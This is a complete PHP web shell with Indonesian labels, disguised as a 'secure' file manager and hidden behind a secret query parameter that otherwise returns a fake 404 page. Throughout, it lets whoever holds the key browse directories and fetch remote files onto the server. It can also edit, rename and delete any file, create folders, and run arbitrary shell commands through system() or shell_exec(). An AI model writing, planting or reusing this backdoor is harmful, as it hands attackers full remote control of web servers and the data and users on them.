<?php
// Proteksi akses: hanya izinkan jika query ?nyenye=ssi
if (!isset($_GET['nyenye']) || $_GET['nyenye'] !== 'ssi') {
    header("HTTP/1.0 404 Not Found");
    echo "<h1>404 Not Found</h1>";
    exit;
}

// Mulai isi panel di bawah ini
error_reporting(0);
echo "<h2>🔧 File Manager Panel PHP (Secure)</h2>";

$dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
if (empty($dir)) $dir = getcwd();

// ============ CEK ISI DIREKTORI ============
echo "<h3>📁 Cek Isi Directory</h3>";
if (is_dir($dir) && is_readable($dir)) {
    echo "<p>Directory yang dicek: <strong>" . htmlspecialchars($dir) . "</strong></p><pre>";
    foreach (scandir($dir) as $file) echo $file . "\n";
    echo "</pre>";
} else {
    echo "<p style='color:red;'>❌ Directory tidak ditemukan atau tidak bisa diakses.</p>";
}
echo '
<form method="get">
    <input type="hidden" name="nyenye" value="ssi">
    <label>Path directory:</label><br>
    <input type="text" name="dir" size="60" value="' . htmlspecialchars($dir) . '">
    <input type="submit" value="Cek Directory">
</form><hr>';

// ============ DOWNLOAD FILE DARI URL ============
echo "<h3>🌐 Download File dari URL</h3>";
$url = $_GET['url'] ?? '';
$save_to = $_GET['save_to'] ?? '';
echo '
<form method="get">
    <input type="hidden" name="nyenye" value="ssi">
    <label>URL File:</label><br>
    <input type="text" name="url" size="60" value="' . htmlspecialchars($url) . '"><br>
    <label>Simpan sebagai (path):</label><br>
    <input type="text" name="save_to" size="60" value="' . htmlspecialchars($save_to) . '">
    <input type="submit" value="Download">
</form>';
if ($url && $save_to) {
    echo "<pre>";
    $data = @file_get_contents($url);
    if ($data !== false && @file_put_contents($save_to, $data)) {
        echo "✅ File berhasil disimpan ke: $save_to";
    } else {
        echo "❌ Gagal download atau simpan file.";
    }
    echo "</pre>";
}
echo "<hr>";

// ============ RENAME FILE ============
echo "<h3>✏️ Rename File</h3>";
$old_name = $_GET['old_name'] ?? '';
$new_name = $_GET['new_name'] ?? '';
echo '
<form method="get">
    <input type="hidden" name="nyenye" value="ssi">
    <label>Nama file lama (path):</label><br>
    <input type="text" name="old_name" size="60" value="' . htmlspecialchars($old_name) . '"><br>
    <label>Nama file baru (path):</label><br>
    <input type="text" name="new_name" size="60" value="' . htmlspecialchars($new_name) . '">
    <input type="submit" value="Rename">
</form>';
if ($old_name && $new_name) {
    echo "<pre>";
    if (file_exists($old_name) && @rename($old_name, $new_name)) {
        echo "✅ Berhasil rename ke: $new_name";
    } else {
        echo "❌ Gagal rename file.";
    }
    echo "</pre>";
}
echo "<hr>";

// ============ HAPUS FILE ============
echo "<h3>🗑️ Hapus File</h3>";
$delete_file = $_GET['delete_file'] ?? '';
echo '
<form method="get" onsubmit="return confirm(\'Yakin ingin menghapus file ini?\');">
    <input type="hidden" name="nyenye" value="ssi">
    <label>Path file yang ingin dihapus:</label><br>
    <input type="text" name="delete_file" size="60" value="' . htmlspecialchars($delete_file) . '">
    <input type="submit" value="Hapus">
</form>';
if ($delete_file) {
    echo "<pre>";
    if (file_exists($delete_file) && @unlink($delete_file)) {
        echo "✅ File berhasil dihapus.";
    } else {
        echo "❌ Gagal hapus file.";
    }
    echo "</pre>";
}
echo "<hr>";

// ============ BUAT DIREKTORI ============
echo "<h3>📂 Buat Direktori</h3>";
$new_dir = $_GET['new_dir'] ?? '';
echo '
<form method="get">
    <input type="hidden" name="nyenye" value="ssi">
    <label>Path direktori baru:</label><br>
    <input type="text" name="new_dir" size="60" value="' . htmlspecialchars($new_dir) . '">
    <input type="submit" value="Buat Folder">
</form>';
if ($new_dir) {
    echo "<pre>";
    if (file_exists($new_dir)) {
        echo "⚠️ Direktori sudah ada.";
    } elseif (@mkdir($new_dir, 0755, true)) {
        echo "✅ Direktori berhasil dibuat.";
    } else {
        echo "❌ Gagal membuat direktori.";
    }
    echo "</pre>";
}
echo "<hr>";

// ============ EDIT FILE ============
echo "<h3>📝 Edit File</h3>";
$edit_file = $_GET['edit_file'] ?? '';
if ($_POST['edit_submit'] === 'Simpan' && $_POST['edit_file']) {
    $edited = file_put_contents($_POST['edit_file'], $_POST['file_content']);
    if ($edited !== false) echo "<p style='color:green;'>✅ File berhasil disimpan.</p>";
    else echo "<p style='color:red;'>❌ Gagal menyimpan file.</p>";
}
echo '
<form method="get">
    <input type="hidden" name="nyenye" value="ssi">
    <label>Path file yang ingin diedit:</label><br>
    <input type="text" name="edit_file" size="60" value="' . htmlspecialchars($edit_file) . '">
    <input type="submit" value="Load File">
</form>';
if ($edit_file && file_exists($edit_file)) {
    $isi = file_get_contents($edit_file);
    echo '
    <form method="post">
        <input type="hidden" name="edit_file" value="' . htmlspecialchars($edit_file) . '">
        <textarea name="file_content" rows="20" cols="100" style="font-family:monospace;">' . htmlspecialchars($isi) . '</textarea><br>
        <input type="submit" name="edit_submit" value="Simpan">
    </form>';
}
echo "<hr>";

// ============ EKSEKUSI SHELL ============
echo "<h3>💻 Jalankan Perintah Shell</h3>";
$cmd = $_GET['cmd'] ?? '';
echo '
<form method="get">
    <input type="hidden" name="nyenye" value="ssi">
    <label>Perintah shell:</label><br>
    <input type="text" name="cmd" size="60" value="' . htmlspecialchars($cmd) . '">
    <input type="submit" value="Jalankan">
</form>';
if ($cmd) {
    echo "<pre>Perintah: <code>$cmd</code>\n\n";
    if (function_exists("system")) system($cmd);
    elseif (function_exists("shell_exec")) echo shell_exec($cmd);
    else echo "❌ Fungsi shell tidak tersedia.";
    echo "</pre>";
}
?>
